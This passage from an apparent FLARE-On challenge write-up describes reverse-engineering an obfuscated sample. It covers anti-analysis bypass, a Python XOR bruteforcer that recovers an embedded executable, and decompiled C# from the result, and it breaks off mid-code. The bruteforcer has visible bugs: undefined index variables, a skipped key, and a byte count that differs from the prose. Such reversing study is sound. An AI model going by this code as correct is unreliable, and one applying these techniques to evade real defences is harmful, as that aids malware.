<p>But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to <code>00401B8D</code> and step through after the breakpoint. Stop before the <code>system</code> call and copy the <code>gratz.exe</code> file from disk.</p>

<p>Here’s my bruteforcer. This is not good code but at that point I just wanted to finish.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>bruteforcer </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
<span class="line-number">100</span>
<span class="line-number">101</span>
<span class="line-number">102</span>
<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
<span class="line-number">111</span>
<span class="line-number">112</span>
<span class="line-number">113</span>
<span class="line-number">114</span>
<span class="line-number">115</span>
<span class="line-number">116</span>
<span class="line-number">117</span>
<span class="line-number">118</span>
<span class="line-number">119</span>
<span class="line-number">120</span>
<span class="line-number">121</span>
<span class="line-number">122</span>
<span class="line-number">123</span>
<span class="line-number">124</span>
<span class="line-number">125</span>
<span class="line-number">126</span>
<span class="line-number">127</span>
<span class="line-number">128</span>
<span class="line-number">129</span>
<span class="line-number">130</span>
<span class="line-number">131</span>
<span class="line-number">132</span>
<span class="line-number">133</span>
<span class="line-number">134</span>
<span class="line-number">135</span>
<span class="line-number">136</span>
<span class="line-number">137</span>
<span class="line-number">138</span>
<span class="line-number">139</span>
<span class="line-number">140</span>
<span class="line-number">141</span>
<span class="line-number">142</span>
<span class="line-number">143</span>
<span class="line-number">144</span>
<span class="line-number">145</span>
<span class="line-number">146</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">key1</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;oh happy dayz&#39;</span>
</span><span class="line"><span class="n">key1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;the final countdown&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key2</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;UNACCEPTABLE!&#39;</span>
</span><span class="line"><span class="n">key2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;omglob&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key3</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;you</span><span class="se">\x27</span><span class="s">re so good&#39;</span>
</span><span class="line"><span class="n">key3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;you</span><span class="se">\x27</span><span class="s">re so bad&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key4</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x66</span><span class="s">&#39;</span>
</span><span class="line"><span class="n">key4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key5</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key5</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Sandboxes are fun to play in&#39;</span>
</span><span class="line"><span class="n">key5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;I</span><span class="se">\x27</span><span class="s">m gonna sandbox your face&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key6</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;I can haz decode?&#39;</span>
</span><span class="line"><span class="n">key6</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Such fire. Much burn. Wow.&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key7</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key7</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x09\x00\x00\x01</span><span class="s">&#39;</span>
</span><span class="line"><span class="n">key7</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Feel the sting of the Monarch!&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key8</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;! 50 1337&#39;</span>
</span><span class="line"><span class="n">key8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;1337&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key9</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key9</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;LETS GO SHOPPING&#39;</span>
</span><span class="line"><span class="n">key9</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;MATH IS HARD&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key10</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key10</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;LETS GO MATH&#39;</span>
</span><span class="line"><span class="n">key10</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;SHOPPING IS HARD&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key11</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span class="s">&#39;</span>
</span><span class="line"><span class="n">key11</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x07\x77</span><span class="s">&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key12</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key12</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;backdoge.exe&quot;</span>
</span><span class="line"><span class="n">key12</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span>
</span><span class="line">
</span><span class="line"><span class="n">key13</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key13</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;192.203.230.10&#39;</span>
</span><span class="line"><span class="n">key13</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">key14</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="n">key14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class="line"><span class="n">key14</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;jackRAT&#39;</span>
</span><span class="line">
</span><span class="line"><span class="n">index</span><span class="o">=</span><span class="p">{}</span>
</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
</span><span class="line">    <span class="n">index</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="c"># we want this to support variable length keys</span>
</span><span class="line"><span class="c"># so if the key is smaller than data, it will wrap around</span>
</span><span class="line"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">mykey</span><span class="p">):</span>
</span><span class="line">    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mykey</span><span class="p">)</span>
</span><span class="line">    <span class="n">datalen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mydata</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">    <span class="c"># easier to just extend the key array, but probably not that memory efficient</span>
</span><span class="line">    <span class="c"># not that we care about it here ;)</span>
</span><span class="line">    <span class="n">key</span> <span class="o">=</span> <span class="n">mykey</span> <span class="o">*</span> <span class="p">(</span> <span class="p">(</span><span class="n">datalen</span><span class="o">/</span><span class="n">keylen</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
</span><span class="line">
</span><span class="line">    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
</span><span class="line">
</span><span class="line"><span class="n">myfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s">&#39;c:</span><span class="se">\\</span><span class="s">extractedgratz.exe&#39;</span><span class="p">,</span><span class="s">&#39;rb&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="n">wholefile</span> <span class="o">=</span> <span class="n">myfile</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class="line">
</span><span class="line"><span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">myfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class="line">
</span><span class="line"><span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">            <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">              <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key12</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]])</span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]])</span>
</span><span class="line">
</span><span class="line">                            <span class="k">if</span> <span class="p">(</span> <span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;M&#39;</span> <span class="ow">and</span> <span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;Z&#39;</span><span class="p">):</span>
</span><span class="line">                              <span class="k">print</span> <span class="s">&quot;Found it&quot;</span>
</span><span class="line">                              <span class="k">print</span> <span class="n">out</span>
</span><span class="line">                              <span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span>
</span><span class="line">
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">ind1</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">ind2</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">ind3</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">ind4</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">ind5</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">ind6</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">ind7</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">ind8</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">ind9</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">ind10</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">ind11</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">ind13</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">ind14</span><span class="p">])</span>
</span><span class="line">                              <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="s">&#39;backdoge.exe&#39;</span><span class="p">)</span>
</span><span class="line">
</span><span class="line">                              <span class="n">decodedfilename</span> <span class="o">=</span> <span class="s">&quot;c:</span><span class="se">\\</span><span class="s">gratz&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">counter</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;.exe&quot;</span>
</span><span class="line">                              <span class="n">decodedfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="n">decodedfilename</span><span class="p">,</span><span class="s">&#39;wb&#39;</span><span class="p">)</span>
</span><span class="line">                              <span class="n">decodedfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span><span class="line">                              <span class="n">decodedfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class="line">
</span><span class="line">                            <span class="c"># be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  </span>
</span><span class="line">                            <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line">                            <span class="n">counter</span> <span class="o">+=</span><span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>It’s a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first <code>0x80</code> bytes of the binary which is the <code>DOS Stub</code>. In the end, it compares the first two bytes with <code>MZ</code> and then xor-es the whole binary before writing it to a file.</p>

<p>I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.</p>

<p><img src="http://parsiya.net/images/2014/flare/7-23.jpg" alt="Almost done" title="Almost done" /></p>

<p>But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Decompiled gratz.exe </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
</pre></td><td class="code"><pre><code class="c#"><span class="line"><span class="k">public</span> <span class="nf">Form1</span><span class="p">()</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">InitializeComponent</span><span class="p">();</span>
</span><span class="line">  <span class="k">new</span> <span class="nf">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">lulzors</span><span class="p">)).</span><span class="n">Start</span><span class="p">();</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="k">public</span> <span class="k">void</span> <span class="nf">lulzors</span><span class="p">()</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="n">lulz</span> <span class="n">lulz</span> <span class="p">=</span> <span class="k">new</span> <span class="n">lulz</span><span class="p">();</span>
</span><span class="line">  <span class="n">Thread</span> <span class="n">thread</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="n">lulz</span><span class="p">.</span><span class="n">datwork</span><span class="p">));</span>
</span><span class="line">  <span class="n">thread</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
</span><span class="line">  <span class="k">do</span>
</span><span class="line">    <span class="p">;</span>
</span><span class="line">  <span class="k">while</span> <span class="p">(</span><span class="n">thread</span><span class="p">.</span><span class="n">IsAlive</span><span class="p">);</span>
</span><span class="line">  <span class="k">this</span><span class="p">.</span><span class="n">label2</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">lulz</span><span class="p">.</span><span class="n">decoder4</span><span class="p">(</span><span class="s">&quot;\v\fP\x000E\x000FBA\x0006\rG\x0015I\x001A\x0001\x0016H\\\t\b\x0002\x0013/\b\t^\x001D\bJO\a]C\x001B\x0005&quot;</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>And inside <code>lulz.cs</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>lulz.cs </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
</pre></td><td class="code"><pre><code class="c#"><span class="line"><span class="c1">// decoder1 and decoder3 omitted</span>
</span><span class="line">
</span><span class="line"><span class="k">public</span> <span class="kt">string</span> <span class="nf">decoder2</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">&quot;&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="s">&quot;this&quot;</span><span class="p">;</span>
